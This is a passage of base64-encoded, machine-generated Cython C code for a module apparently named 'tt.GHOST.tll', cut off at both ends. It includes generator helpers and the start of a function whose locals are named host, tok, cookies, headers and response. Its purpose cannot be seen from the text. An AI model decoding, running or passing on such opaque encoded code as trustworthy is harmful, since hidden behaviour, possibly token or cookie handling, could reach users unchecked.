iA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzc7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTtcbiAgc3dpdGNoIChfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCkge1xuICAgIGNhc2UgMDogZ290byBfX3B5eF9MM19maXJzdF9ydW47XG4gICAgZGVmYXVsdDogXG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIE5VTEw7XG4gIH1cbiAgX19weXhfTDNfZmlyc3RfcnVuOjtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9zZW50X3ZhbHVlKSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfciA9IFB5TGlzdF9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfcikpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpIH1cbiAgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzIgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpXG4gIGZvciAoOzspIHtcbiAgICB7XG4gICAgICBfX3B5eF90XzMgPSBfX3B5eF90XzIoX19weXhfdF8xKTtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkge1xuICAgICAgICBQeU9iamVjdCogZXhjX3R5cGUgPSBQeUVycl9PY2N1cnJlZCgpO1xuICAgICAgICBpZiAoZXhjX3R5cGUpIHtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIH1cbiAgICAgICAgYnJlYWs7XG4gICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2kpO1xuICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pLCBfX3B5eF90XzMpO1xuICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX3B5eF90XzMgPSAwO1xuICAgIF9fcHl4X3RfNCA9IE5VTEw7XG4gICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jYyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUtPl9fcHl4X3Zfc2VsZikpIHsgX19QeXhfUmFpc2VDbG9zdXJlTmFtZUVycm9yKCJzZWxmIik7IF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpIH1cbiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUtPl9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgIF9fcHl4X3RfNyA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgX19weXhfdF80ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTtcbiAgICAgIGFzc2VydChfX3B5eF90XzQpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF83ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfdF82fTtcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF8zKSkpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7XG5cbiAgXG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsgX19weXhfciA9IDA7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7XG4gICAgX19QeXhfQWRkVHJhY2ViYWNrKCJnZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIH1cbiAgX19weXhfTDA6O1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7XG4gICNlbmRpZlxuICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xO1xuICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJ0dF81R0hPU1RfM3RsbF84Z2VuZXJhdG9yMihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0dF81R0hPU1RfM3RsbF82Z2VuZXhwcihQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzApIHtcbiAgc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTtcbiAgX19weXhfY3VyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilfX3B5eF90cF9uZXdfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBOVUxMKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUpKSB7XG4gICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICopUHlfTm9uZSk7XG4gICAgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICAgIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpXG4gIH0gZWxzZSB7XG4gICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIH1cbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqKSBfX3B5eF9zZWxmO1xuICBfX1B5eF9JTkNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSk7XG4gIF9fUHl4X0dJVkVSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSk7XG4gIF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCA9IF9fcHl4X2dlbmV4cHJfYXJnXzA7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IF9fUHl4X0dlbmVyYXRvcl9OZXcoKF9fcHl4X2Nvcm91dGluZV9ib2R5X3QpIF9fcHl4X2diXzJ0dF81R0hPU1RfM3RsbF84Z2VuZXJhdG9yMiwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzJdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HSE9TVF90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfY3VyX3Njb3BlKTtcbiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgICByZXR1cm4gKFB5T2JqZWN0ICopIGdlbjtcbiAgfVxuXG4gIFxuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QudGxsLmdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X0RFQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJ0dF81R0hPU1RfM3RsbF84Z2VuZXJhdG9yMihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSBcbntcbiAgc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKigqX19weXhfdF8yKShQeU9iamVjdCAqKTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzc7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTtcbiAgc3dpdGNoIChfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCkge1xuICAgIGNhc2UgMDogZ290byBfX3B5eF9MM19maXJzdF9ydW47XG4gICAgZGVmYXVsdDogXG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIE5VTEw7XG4gIH1cbiAgX19weXhfTDNfZmlyc3RfcnVuOjtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9zZW50X3ZhbHVlKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfciA9IFB5TGlzdF9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfcikpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpIH1cbiAgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzIgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpXG4gIGZvciAoOzspIHtcbiAgICB7XG4gICAgICBfX3B5eF90XzMgPSBfX3B5eF90XzIoX19weXhfdF8xKTtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkge1xuICAgICAgICBQeU9iamVjdCogZXhjX3R5cGUgPSBQeUVycl9PY2N1cnJlZCgpO1xuICAgICAgICBpZiAoZXhjX3R5cGUpIHtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIH1cbiAgICAgICAgYnJlYWs7XG4gICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2kpO1xuICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pLCBfX3B5eF90XzMpO1xuICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX3B5eF90XzMgPSAwO1xuICAgIF9fcHl4X3RfNCA9IE5VTEw7XG4gICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jYyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUtPl9fcHl4X3Zfc2VsZikpIHsgX19QeXhfUmFpc2VDbG9zdXJlTmFtZUVycm9yKCJzZWxmIik7IF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpIH1cbiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUtPl9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgIF9fcHl4X3RfNyA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgX19weXhfdF80ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTtcbiAgICAgIGFzc2VydChfX3B5eF90XzQpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF83ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfdF82fTtcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF8zKSkpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7XG5cbiAgXG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsgX19weXhfciA9IDA7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7XG4gICAgX19QeXhfQWRkVHJhY2ViYWNrKCJnZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIH1cbiAgX19weXhfTDA6O1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7XG4gICNlbmRpZlxuICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xO1xuICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0dF81R0hPU1RfMTB0bGwoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZikge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqX19weXhfY3VyX3Njb3BlO1xuICBQeU9iamVjdCAqX19weXhfdl9uMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X24yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaG9zdCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2hlMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3JlczEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9tYXRjaCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3RvayA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2Nvb2tpZXMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9oZWFkZXJzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZGF0YSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdGxfbWF0Y2ggPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl90bCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2YgPSBOVUxMO1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfZ2JfMnR0XzVHSE9TVF8zdGxsXzJnZW5lcmF0b3IgPSAwO1xuICBQeU9iamVjdCAqX19weXhfZ2JfMnR0XzVHSE9TVF8zdGxsXzVnZW5lcmF0b3IxID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X2diXzJ0dF81R0hPU1RfM3RsbF84Z2VuZXJhdG9yMiA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzg7XG4gIGludCBfX3B5eF90Xzk7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMlsxMV07XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3